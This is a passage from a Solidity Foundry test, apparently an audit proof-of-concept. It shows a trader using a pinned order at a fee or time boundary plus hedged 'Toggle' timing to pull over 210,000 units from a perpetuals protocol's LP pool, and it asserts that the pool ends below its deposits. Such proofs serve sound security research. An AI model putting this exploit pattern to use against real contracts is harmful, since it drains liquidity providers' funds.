        uint64 shortOpenId = router.commitOrder(shortOpen);
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(openedAt + 1);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory opened =
            router.executeOrder(shortOpenId, _tick(uint64(openedAt + 1), uint64(openedAt), 0));
        assertEq(uint8(opened.status), uint8(OrderV3Types.LifecycleStatus.Executed));

        uint256 c = FAD_BOUNDARY;
        vm.warp(c);
        _fundTrader(PINNER, 10_000e6);
        router.updateMarkPrice(_tick(uint64(c), uint64(c - 1), 0));
        OrderV3Types.OrderRequest memory pin = _request(false, 10_000e18, 1000e6, type(uint32).max);
        pin.bounds.executionWindowSeconds = 60;
        vm.prank(PINNER);
        uint64 pinId = router.commitOrder(pin);
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(c + 2);
        uint256 poolBefore = settlementToken.balanceOf(address(pool));
        uint256 snapshot = vm.snapshotState();
        (uint256 downWallet, uint256 downPool) = _runHedged(c, pinId, shortAccount, coordinator, -1, Plan.Toggle);
        vm.revertToState(snapshot);
        (uint256 downEarlyWallet, uint256 downEarlyPool) =
            _runHedged(c, pinId, shortAccount, coordinator, -1, Plan.Early);
        vm.revertToState(snapshot);
        (uint256 downWaitWallet, uint256 downWaitPool) = _runHedged(c, pinId, shortAccount, coordinator, -1, Plan.Wait);
        vm.revertToState(snapshot);
        (uint256 upWallet, uint256 upPool) = _runHedged(c, pinId, shortAccount, coordinator, 1, Plan.Toggle);
        vm.revertToState(snapshot);
        (uint256 upEarlyWallet, uint256 upEarlyPool) = _runHedged(c, pinId, shortAccount, coordinator, 1, Plan.Early);
        vm.revertToState(snapshot);
        (uint256 upWaitWallet, uint256 upWaitPool) = _runHedged(c, pinId, shortAccount, coordinator, 1, Plan.Wait);

        emit log_named_uint("hedged pool cash before", poolBefore);
        emit log_named_uint("hedged down total wallet", downWallet);
        emit log_named_uint("hedged down early wallet", downEarlyWallet);
        emit log_named_uint("hedged down wait wallet", downWaitWallet);
        emit log_named_uint("hedged up total wallet", upWallet);
        emit log_named_uint("hedged up early wallet", upEarlyWallet);
        emit log_named_uint("hedged up wait wallet", upWaitWallet);
        emit log_named_uint("hedged down pool cash", downPool);
        emit log_named_uint("hedged up pool cash", upPool);
        emit log_named_uint("hedged down early pool cash", downEarlyPool);
        emit log_named_uint("hedged down wait pool cash", downWaitPool);
        emit log_named_uint("hedged up early pool cash", upEarlyPool);
        emit log_named_uint("hedged up wait pool cash", upWaitPool);
        uint256 contributedLpAssets = _initialJuniorSeedDeposit() + _initialSeniorSeedDeposit()
            + _initialJuniorDeposit() + _initialSeniorDeposit();
        assertEq(contributedLpAssets, 1_002_000e6);
        assertGt(downWallet, 210_000e6);
        assertGt(upWallet, 210_000e6);
        assertGt(downWallet, downEarlyWallet);
        assertGt(downWallet, downWaitWallet);
        assertGt(upWallet, upEarlyWallet);
        assertGt(upWallet, upWaitWallet);
        assertLt(downPool, poolBefore);
        assertLt(upPool, poolBefore);
        assertLt(downPool, contributedLpAssets);
        assertLt(upPool, contributedLpAssets);
        assertLt(downPool, downEarlyPool);
        assertLt(downPool, downWaitPool);
        assertLt(upPool, upEarlyPool);
        assertLt(upPool, upWaitPool);
    }
}

```
